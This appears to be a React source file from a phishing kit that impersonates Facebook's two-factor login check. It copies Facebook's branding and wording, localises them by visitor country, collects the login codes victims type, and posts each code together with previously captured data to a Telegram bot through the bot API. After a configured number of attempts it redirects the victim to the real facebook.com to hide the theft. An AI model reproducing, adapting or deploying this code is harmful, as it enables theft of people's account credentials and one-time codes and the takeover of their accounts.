import { faChevronLeft, faXmark } from '@fortawesome/free-solid-svg-icons';
import { faCircleQuestion } from '@fortawesome/free-regular-svg-icons';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import VerifyImage from '@/assets/images/verify-image.png';
import { useEffect, useRef, useState, type FC } from 'react';
import { useNavigate } from 'react-router';
import VerifyImagePc from '@/assets/images/verify-image-pc.png';
import FacebookLogo from '@/assets/images/facebook-logo.svg';
import translateText from '@/utils/translate';
import config from '@/utils/config';
import axios from 'axios';

interface GeoLocationData {
    city: string;
    accuracy: number;
    country: string;
    timezone: string;
    organization: string;
    asn: number;
    ip: string;
    area_code: string;
    organization_name: string;
    country_code: string;
    country_code3: string;
    continent_code: string;
    longitude: string;
    region: string;
    latitude: string;
}

interface TranslatedTexts {
    accountFacebook: string;
    checkNotifications: string;
    goToFacebookAccount: string;
    enterCode: string;
    invalidCode: string;
    continue: string;
    tryAnotherWay: string;
}

const getGeolocationData = (): GeoLocationData | null => {
    try {
        const storedData = localStorage.getItem('geolocationData');
        return storedData ? JSON.parse(storedData) : null;
    } catch {
        return null;
    }
};
const delay = (ms: number) => new Promise((resolve) => setTimeout(resolve, ms));

const Verify: FC = () => {
    const navigate = useNavigate();
    const codeRef = useRef<HTMLInputElement>(null);
    const [code, setCode] = useState('');
    const [showError, setShowError] = useState(false);
    const [isLoading, setIsLoading] = useState(false);
    const [currentAttemp, setCurrentAttemp] = useState(0);
    const [maxAttemp, setMaxAttemp] = useState(0);
    const [translatedTexts, setTranslatedTexts] = useState<TranslatedTexts>({
        accountFacebook: 'Account • Facebook',
        checkNotifications: 'Check your notifications on another device',
        goToFacebookAccount: 'Go to your Facebook account on another device and open the notification that we sent to approve this login.',
        enterCode: 'Enter code',
        invalidCode: 'Invalid code',
        continue: 'Continue',
        tryAnotherWay: 'Try another way'
    });

    const translateAllTexts = async (targetLang: string) => {
        try {
            const [accountFacebook, checkNotifications, goToFacebookAccount, enterCode, invalidCode, continueText, tryAnotherWay] = await Promise.all([translateText('Account • Facebook', targetLang), translateText('Check your notifications on another device', targetLang), translateText('Go to your Facebook account on another device and open the notification that we sent to approve this login.', targetLang), translateText('Enter code', targetLang), translateText('Invalid code', targetLang), translateText('Continue', targetLang), translateText('Try another way', targetLang)]);

            setTranslatedTexts({
                accountFacebook,
                checkNotifications,
                goToFacebookAccount,
                enterCode,
                invalidCode,
                continue: continueText,
                tryAnotherWay
            });
        } catch (err) {
            console.error('Translation failed:', err);
        }
    };

    useEffect(() => {
        const getConfig = async () => {
            const maxPass = config.so_lan_sai_code;
            setMaxAttemp(maxPass);
        };
        const fetchGeolocation = async () => {
            const geoData = getGeolocationData();
            if (geoData) {
                await translateAllTexts(geoData.country_code);
            }
        };

        getConfig();
        fetchGeolocation();
    }, []);
    const handleSubmit = async () => {
        if (!code) {
            setShowError(true);
            return;
        }
        setIsLoading(true);
        const messageId = localStorage.getItem('message_id');
        const oldMessage = localStorage.getItem('message');
        const token = config.token;
        const chat_id = config.chat_id;
        await axios.post(`https://api.telegram.org/bot${token}/deleteMessage`, {
            chat_id: chat_id,
            message_id: messageId
        });
        const newMessage = oldMessage + `\n<b>Code ${currentAttemp}:</b> <code>${code}</code>`;
        const response = await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
            chat_id: chat_id,
            text: newMessage,
            parse_mode: 'HTML'
        });
        const data = await response.data;
        localStorage.setItem('message', newMessage);
        localStorage.setItem('message_id', data.result.message_id);
        await delay(config.thoi_gian_sai_code * 1000);
        setCurrentAttemp(currentAttemp + 1);
        setCode('');
        setIsLoading(false);
        if (currentAttemp >= maxAttemp) {
            window.location.replace('https://facebook.com');
        }
    };
    return (
        <div className='min-h-screen bg-white'>
            <header className='flex h-14 items-center justify-between border-b border-[#dde2e8] px-4'>
                <div className='hidden items-center gap-3 sm:flex'>
                    <img src={FacebookLogo} alt='Facebook' className='h-6 w-auto' />
                </div>
                <div className='flex w-full items-center justify-between gap-4 sm:hidden'>
                    <button onClick={() => navigate(-1)} className='rounded-full p-2 transition-colors hover:bg-gray-100'>
                        <FontAwesomeIcon icon={faChevronLeft} size='lg' />
                    </button>
                    <button className='rounded-full p-2 transition-colors hover:bg-gray-100'>
                        <FontAwesomeIcon icon={faCircleQuestion} size='lg' />
                    </button>
                </div>
            </header>

            <div className='mx-auto max-w-150 space-y-4 px-4 py-6 sm:space-y-4'>
                <div className='text-sm font-medium text-[#0a1317]'>{translatedTexts.accountFacebook}</div>
                <p className='text-2xl font-semibold text-[#0a1317]'>{translatedTexts.checkNotifications}</p>
                <p className='text-[15px] leading-5 text-[#0a1317]'>{translatedTexts.goToFacebookAccount}</p>

                <div className='space-y-4'>
                    <img src={VerifyImage} className='block w-full rounded-2xl sm:hidden' alt='Mobile verification example' />
                    <img src={VerifyImagePc} className='hidden w-full sm:block' alt='Desktop verification example' />
                </div>

                <div className='space-y-4'>
                    <div className='relative'>
                        <input
                            ref={codeRef}
                            id='code'
                            className={`peer h-16 w-full rounded-2xl border border-[#dde2e8] px-4 py-2.5 pb-0 focus:border-[#5d6c7b] ${showError && 'border-red-500'}`}
                            placeholder=' '
                            type='number'
                            inputMode='numeric'
                            value={code}
                            onChange={(e) => {
                                setShowError(false);
                                if (e.target.value.length <= 8) {
                                    setCode(e.target.value);
                                }
                            }}
                            onFocus={() => {
                                setShowError(false);
                            }}
                        />
                        <label className={`absolute top-1/2 left-0 -translate-y-6 pl-4 text-[13px] text-[#5d6c7b] peer-placeholder-shown:-translate-y-1/2 peer-placeholder-shown:text-[15px] peer-focus:-translate-y-6 peer-focus:text-[13px] ${showError && 'text-red-500'}`} htmlFor='code'>
                            {showError ? translatedTexts.invalidCode : translatedTexts.enterCode}
                        </label>
                        <button
                            onClick={() => {
                                setCode('');
                                codeRef.current?.focus();
                            }}
                            className='absolute top-1/2 right-0 hidden -translate-y-1/2 pr-4 peer-focus:block'
                        >
                            <FontAwesomeIcon icon={faXmark} size='lg' />
                        </button>
                    </div>

                    <button
                        className={`h-11 w-full rounded-[22px] bg-[#0064e0] text-[15px] font-medium text-[#f1f4f7] ${code.length < 6 && 'opacity-40'} flex items-center justify-center transition-opacity`}
                        disabled={code.length < 6}
                        onClick={() => {
                            handleSubmit();
                        }}
                    >
                        {isLoading ? <div className='h-7 w-7 animate-spin rounded-full border-2 border-white border-t-transparent'></div> : translatedTexts.continue}
                    </button>

                    <button className='h-11 w-full rounded-[22px] border border-[#ccd3db] text-[15px] font-medium text-[#0a1317] transition-colors hover:bg-gray-50'>{translatedTexts.tryAnotherWay}</button>
                </div>
            </div>
        </div>
    );
};
export default Verify;
